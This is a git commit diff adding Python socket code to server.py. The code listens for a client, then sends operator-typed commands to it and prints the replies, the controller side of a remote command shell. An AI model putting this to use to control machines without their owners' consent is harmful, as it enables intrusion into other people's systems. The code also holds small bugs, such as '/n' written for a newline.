1d987a0c4f19164d049f8f24c39d8ae33f9b0f10
unknown <joe2@gmail.com>
2024-09-17 10:00:29 +0530

    new changes

--- server.py
+++ server.py
@@ -20,10 +20,38 @@ def bind_socket():
     try:
         print('Binding the port : ' +str(port))
         s.bind((host,port))
-        s.listen()
+        s.listen(255)
 
     except socket.error as msg:
         print('Socket Binding error : ' + str(msg)+'/n'+'Retrying...')
         bind_socket()
 
+#Establish a connection with a client (socket must be listing)
+
+def socket_accept():
+    conn, address = s.accept()
+    print('Connection Established : IP=' +address[0]+ ' PORT='+str(address[1]))
+    send_commands(conn)
+    conn.close()
+
+#send commands to clients:
+def send_commands(conn):
+    while True:
+        cmd = input()
+        if cmd == 'quit':
+            conn.close()
+            s.close()
+            sys.exit()
+        if len(str.encode(cmd)) > 0:
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(1024), 'utf-8')
+            print(client_response, end="")
+        
+
+def main():
+    create_socket()
+    bind_socket()
+    socket_accept()
+
+main()
 
